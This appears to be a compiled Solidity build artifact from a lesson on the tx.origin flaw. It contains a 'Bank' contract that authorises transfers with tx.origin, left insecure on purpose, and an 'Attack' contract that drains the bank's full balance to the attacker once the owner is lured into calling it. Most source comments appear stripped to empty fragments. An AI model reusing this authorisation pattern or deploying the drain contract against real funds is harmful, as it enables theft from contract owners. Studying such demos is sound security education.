{
  "contractName": "Bank",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor",
      "payable": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610425806100536000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063a9059cbb14610059575b600080fd5b610043610075565b60405161005091906102fc565b60405180910390f35b610073600480360381019061006e9190610202565b610099565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff1614610127576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161011e90610337565b60405180910390fd5b60008273ffffffffffffffffffffffffffffffffffffffff168260405161014d906102e7565b60006040518083038185875af1925050503d806000811461018a576040519150601f19603f3d011682016040523d82523d6000602084013e61018f565b606091505b50509050806101d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101ca90610317565b60405180910390fd5b505050565b6000813590506101e7816103c1565b92915050565b6000813590506101fc816103d8565b92915050565b6000806040838503121561021557600080fd5b6000610223858286016101d8565b9250506020610234858286016101ed565b9150509250929050565b61024781610373565b82525050565b600061025a601483610362565b91507f4661696c656420746f2073656e642045746865720000000000000000000000006000830152602082019050919050565b600061029a600983610362565b91507f4e6f74206f776e657200000000000000000000000000000000000000000000006000830152602082019050919050565b60006102da600083610357565b9150600082019050919050565b60006102f2826102cd565b9150819050919050565b6000602082019050610311600083018461023e565b92915050565b600060208201905081810360008301526103308161024d565b9050919050565b600060208201905081810360008301526103508161028d565b9050919050565b600081905092915050565b600082825260208201905092915050565b600061037e82610397565b9050919050565b600061039082610397565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6103ca81610385565b81146103d557600080fd5b50565b6103e1816103b7565b81146103ec57600080fd5b5056fea2646970667358221220b742dfd85dc935225d9e75d74e7c542892e9bc21326e9b4ead9274874739f49764736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\ncontract Bank {\r\n    address public owner;//\r\n\r\n    // owner \r\n    constructor() payable {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function transfer(address payable _to, uint _amount) public {\r\n        //  owner\r\n        require(tx.origin == owner, \"Not owner\");\r\n        //ETH\r\n        (bool sent, ) = _to.call{value: _amount}(\"\");\r\n        require(sent, \"Failed to send Ether\");\r\n    }\r\n}\r\ncontract Attack {\r\n    // \r\n    address payable public hacker;\r\n    // Bank\r\n    Bank bank;\r\n\r\n    constructor(Bank _bank) {\r\n        //address_bankBank\r\n        bank = Bank(_bank);\r\n        //\r\n        hacker = payable(msg.sender);\r\n    }\r\n\r\n    function attack() public {\r\n        //bankownerbank\r\n        bank.transfer(hacker, address(bank).balance);\r\n    }\r\n}",
  "sourcePath": "D:\\workPlace\\\\9\\\\Attack\\TxOrigin\\contracts\\Bank.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-11T07:07:04.820Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}